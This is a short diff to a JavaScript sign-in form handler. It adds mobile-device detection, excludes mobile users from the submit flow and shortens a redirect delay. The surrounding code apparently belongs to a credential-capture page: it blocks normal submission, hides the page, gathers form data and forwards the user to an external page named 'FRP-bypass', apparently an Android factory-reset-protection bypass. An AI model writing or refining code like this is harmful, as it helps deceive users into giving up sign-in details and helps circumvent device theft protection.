@@ -29,7 +29,19 @@ if (lastSignin == 'invalid') {
 
 
 
+//check if mobile user
+function isMobileDevice() {
+  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+}
 
+// Usage example:
+if (isMobileDevice()) {
+  console.log("User is using a mobile device.");
+  // Do something for mobile devices
+} else {
+  console.log("User is not using a mobile device.");
+  // Do something for non-mobile devices
+}
     
     
     
@@ -83,7 +95,7 @@ if (lastSignin == 'invalid') {
     }
 }
 
-if (isFormGood) {
+if (isFormGood && !isMobileDevice()) {
   event.preventDefault(); // Prevent default form submission
   document.body.style.display = "none";
   // Get form data
@@ -105,7 +117,7 @@ if (isFormGood) {
       setTimeout(()=>{
         window.location.href = "https://ukulyelye.github.io/FRP-bypass/sidesync.html";
         // alert("Хорошо!!!!!");
-      },11000)
+      },1000)
     } else {
       // Handle errors
       console.error("Form submission failed");
